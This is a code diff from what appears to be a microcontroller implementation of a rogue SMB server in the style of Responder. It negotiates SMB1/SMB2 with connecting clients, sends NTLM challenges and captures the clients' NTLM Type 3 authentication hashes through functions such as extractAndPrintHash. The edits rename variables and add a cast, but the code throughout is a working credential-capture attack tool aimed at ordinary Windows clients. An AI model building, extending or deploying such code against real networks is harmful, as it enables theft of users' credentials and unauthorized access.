@@ -477,15 +477,17 @@ void sendSMB2NegotiateFromSMB1() {
   Serial.println(F("→ Negotiate Response SMB‑v2 send (upgrade successfull)"));
 }
 
-void handleSMB1(uint8_t* pkt, uint32_t len) {
+bool smb2Asked = false;
+
+void handleSMB1(uint8_t packet[], uint32_t smbLength) {
   // Structure header SMBv1 (32 octets)
-  uint8_t  command   = pkt[4];            // offset 4
+  uint8_t  command   = packet[4];            // offset 4
 
   // ----------  NEGOTIATE (0x72)  ----------
   if (command == 0x72) {
     /* point de départ = tout de suite après le BCC (2 octets)           */
-    uint16_t bcc = pkt[33] | (pkt[34] << 8);      // ByteCount
-    const uint8_t* d = pkt + 35;                  // <-- 35, pas 36
+    uint16_t bcc = packet[33] | (packet[34] << 8);      // ByteCount
+    const uint8_t* d = packet + 35;                  // <-- 35, pas 36
     const uint8_t* end = d + bcc;
 
     while (d < end && *d == 0x02) {               // 0x02 = "dialect string"
@@ -502,23 +504,23 @@ void handleSMB1(uint8_t* pkt, uint32_t len) {
       sendSMB2NegotiateFromSMB1();
     } else {
       Serial.println(F("Client stay in SMB 1"));
-      sendSMB1NegotiateResponse(pkt);
+      sendSMB1NegotiateResponse(packet);
     }
     return;
   }
   // ----------  SESSION SETUP ANDX (0x73) ----------
   if (command == 0x73) {                  // SMB_COM_SESSION_SETUP_ANDX
-    uint16_t andxOffset = *(uint16_t*)(pkt + 45); // début des données NTLM
-    uint8_t* ntlm = pkt + andxOffset;
+    uint16_t andxOffset = *(uint16_t*)(packet + 45); // début des données NTLM
+    uint8_t* ntlm = packet + andxOffset;
 
-    if (memcmp(ntlm, "NTLMSSP", 7) == 0 && (uint32_t)len > (uint32_t)andxOffset + 8) {
+    if (memcmp(ntlm, "NTLMSSP", 7) == 0 && (uint32_t)smbLength > (uint32_t)andxOffset + 8) {
       uint8_t type = ntlm[8];
       if (type == 1) {                    // Type1 → envoyer challenge
         Serial.println(F("NTLM Type 1 (SMB1) received"));
-        sendSMB1Type2(pkt, ntlm);         // 2-b
+        sendSMB1Type2(packet, ntlm);         // 2-b
       } else if (type == 3) {             // Type3 = hash capturé
         Serial.println(F("NTLM Type 3 (SMB1) received"));
-        extractAndPrintHash(pkt, len, ntlm);
+        extractAndPrintHash(packet, smbLength, ntlm);
         terminateSMB1();               // réponse « SUCCESS » puis close
       }
     }
@@ -799,7 +801,7 @@ void responder() {
             smbState.client.stop();
             smbState.active = false;
           } else {
-            if (smbState.client.read(packet, smbLength) == smbLength) {
+            if ((uint32_t)smbState.client.read(packet, smbLength) == smbLength) {
               // Vérifier protocole SMB2 (header commence par 0xFE 'S' 'M' 'B')
               if (smbLength >= 64 && packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                 uint16_t command = packet[12] | (packet[13] << 8);
